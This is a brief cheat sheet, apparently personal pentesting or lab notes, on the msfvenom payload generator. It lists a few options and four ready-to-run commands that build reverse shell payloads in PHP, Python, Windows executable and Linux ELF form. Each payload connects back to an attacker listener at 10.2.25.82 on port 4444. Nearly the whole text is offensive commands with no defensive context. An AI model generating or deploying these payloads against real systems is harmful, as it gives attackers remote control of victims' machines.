### Options
- `--list formats` shows formats of payloads (ex. `.exe`, `.py`, etc.)
- `-e` encodes payload (ex. `php/base64`)
- `-p` payload to use
### Examples
###### PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.2.25.82 LPORT=4444 -f raw > reverse_shell.php
```
###### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=10.2.25.82 LPORT=4444 -f raw > rev_shell.py
```
###### Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.25.82 LPORT=4444 -f exe > rev_shell.exe
```
###### Linux Executable
```
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.2.25.82 LPORT=4444 -f elf > rev_shell.elf`
```